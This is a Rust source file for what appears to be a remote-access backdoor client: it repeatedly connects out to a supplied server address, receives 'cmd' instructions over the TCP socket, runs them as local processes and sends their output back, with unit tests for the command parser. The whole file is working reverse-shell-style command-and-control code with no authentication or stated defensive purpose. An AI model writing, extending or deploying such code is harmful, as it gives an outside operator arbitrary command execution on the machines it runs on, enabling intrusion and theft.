use std::io::Write;
use std::net::TcpStream;
use std::process::Command;
use std::{io, thread, time};

pub fn run(full_address: &str) {
    let mut duration = time::Duration::from_secs(2);
    loop {
        thread::sleep(duration);
        println!("Connecting to server at {}", full_address);
        let stream = TcpStream::connect(full_address);

        match stream {
            Ok(stream) => {
                println!("Connected to server at {}", full_address);
                let _ = handle_stream(stream);
            }
            Err(_) => {
                println!("Failed to connect to server at {}", full_address);
                continue;
            }
        }
    }
}

fn handle_stream(mut stream: TcpStream) -> Result<(), io::Error> {
    let instruction = parse_stream(&stream);

    match instruction.execute() {
        Ok(output) => {
            output.send_feedback(&mut stream)?;
        }
        Err(_err) => {
            //Error while executing instruction
        }
    }
    Ok(())
}

fn parse_stream(stream: &TcpStream) -> Box<dyn Executable> {
    let mut buffer = [0; 1024];
    stream
        .peek(&mut buffer)
        .expect("Failed to read from stream");

    let input = String::from_utf8_lossy(&buffer[..]);
    let input = input.trim_matches(char::from(0));
    println!("Received command: {}", input);

    instruction_factory(input)
}

fn parse_command(command: &str) -> Command {
    let mut cmd;
    let mut parts = command.split_whitespace();

    match parts.next() {
        Some(part) => {
            cmd = Command::new(part);
        }
        None => {
            return Command::new("");
        }
    }

    loop {
        match parts.next() {
            Some(part) => {
                cmd.arg(part);
            }
            None => break,
        }
    }

    cmd
}

struct InstructionOutput {
    output: String,
}
impl InstructionOutput {
    fn send_feedback(&self, stream: &mut TcpStream) -> Result<(), io::Error> {
        stream.write(&self.output.as_bytes())?;
        Ok(())
    }
}
trait Executable {
    fn execute(&self) -> Result<InstructionOutput, io::Error>;
}

struct ReceivedCommand {
    command: String,
}

impl ReceivedCommand {
    fn from_string(command: String) -> Self {
        ReceivedCommand { command }
    }
}

impl Executable for ReceivedCommand {
    fn execute(&self) -> Result<InstructionOutput, std::io::Error> {
        let mut command = parse_command(&self.command);
        let output = command.output();

        match output {
            Ok(output) => Ok(InstructionOutput {
                output: format!(
                    "\n{}\n{}\n",
                    String::from_utf8_lossy(&output.stdout),
                    String::from_utf8_lossy(&output.stderr)
                ),
            }),
            Err(err) => Ok(InstructionOutput {
                output: format!("{}\n", err),
            }),
        }
    }
}

struct ReceivedSetting {
    key: String,
    value: String,
}

impl ReceivedSetting {
    fn from_string(key: String, value: String) -> Self {
        ReceivedSetting { key, value }
    }
}

impl Executable for ReceivedSetting {
    fn execute(&self) -> Result<InstructionOutput, io::Error> {
        todo!("when settings are available implement thier execution");
    }
}

fn instruction_factory(instruction: &str) -> Box<dyn Executable> {
    let parts: Vec<&str> = instruction.split_whitespace().collect();
    match parts[0] {
        "cmd" => Box::new(ReceivedCommand::from_string(parts[1..].join(" "))),
        "set" => Box::new(ReceivedSetting::from_string(
            parts[1].to_string(),
            parts[2].to_string(),
        )),
        _ => Box::new(ReceivedCommand::from_string("".to_string())),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_command_with_just_command() {
        let command = "ls";
        let result = parse_command(command);
        assert_eq!(result.get_program(), "ls");
        assert_eq!(result.get_args().count(), 0);
    }

    #[test]
    fn test_parse_command_with_one_arg() {
        let command = "ls -l";
        let result = parse_command(command);
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-l"]);
    }

    #[test]
    fn test_parse_command_with_multiple_args_one_dash() {
        let command = "ls -la";
        let result = parse_command(command);
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-la"]);
    }

    #[test]
    fn test_parse_command_with_multiple_args_multiple_dashes() {
        let command = "ls -l -a";
        let result = parse_command(command);
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-l", "-a"]);
    }

    #[test]
    fn test_parse_command_with_empty_command() {
        let command = "";
        let result = parse_command(command);

        assert_eq!(result.get_program(), "");
        assert_eq!(result.get_args().count(), 0);
    }

    #[test]
    fn test_parse_command_with_whitespace_command() {
        let command = "   ls      -l      -a     ";
        let result = parse_command(command);
        let args: Vec<&std::ffi::OsStr> = result.get_args().collect();

        assert_eq!(result.get_program(), "ls");
        assert_eq!(args, &["-l", "-a"]);
    }
}
